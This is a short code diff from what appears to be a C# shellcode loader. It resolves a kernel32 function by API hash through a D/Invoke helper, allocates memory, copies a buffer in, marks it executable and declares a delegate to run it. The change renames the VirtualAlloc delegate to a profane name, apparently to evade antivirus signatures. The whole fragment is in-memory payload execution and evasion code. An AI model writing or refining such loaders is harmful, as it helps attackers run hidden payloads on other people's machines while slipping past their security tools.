@@ -26,8 +26,8 @@ namespace NETDelegate
             //3d4f0f8e
             IntPtr GetNeedDLL = Dinvoke.GetModuleAddress("kernel32.dll");
             IntPtr FuncAddr = Dinvoke.GetExpAddressByHASH(GetNeedDLL, @"3d4f0f8e");
-            VirtualAlloc virtualAlloc = (VirtualAlloc)Marshal.GetDelegateForFunctionPointer(FuncAddr, typeof(VirtualAlloc));
-            IntPtr addr = virtualAlloc(0, buf.Length, 0x1000, 0x04);
+            FuckAlloc FuckAlloc = (FuckAlloc)Marshal.GetDelegateForFunctionPointer(FuncAddr, typeof(FuckAlloc));
+            IntPtr addr = FuckAlloc(0, buf.Length, 0x1000, 0x04);
             Marshal.Copy(buf, 0, addr, buf.Length);
             uint word;
             MYVIRTULProtect(addr, (UIntPtr)buf.Length, (uint)AllocationProtect.PAGE_EXECUTE, out word);
@@ -37,7 +37,7 @@ namespace NETDelegate
         }
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate IntPtr VirtualAlloc(UInt32 lpStartAddr, int size, UInt32 flAllocationType, UInt32 flProtect);
+        private delegate IntPtr FuckAlloc(UInt32 lpStartAddr, int size, UInt32 flAllocationType, UInt32 flProtect);
 
         [UnmanagedFunctionPointerAttribute(CallingConvention.StdCall)]
         public delegate Int32 EXEC();
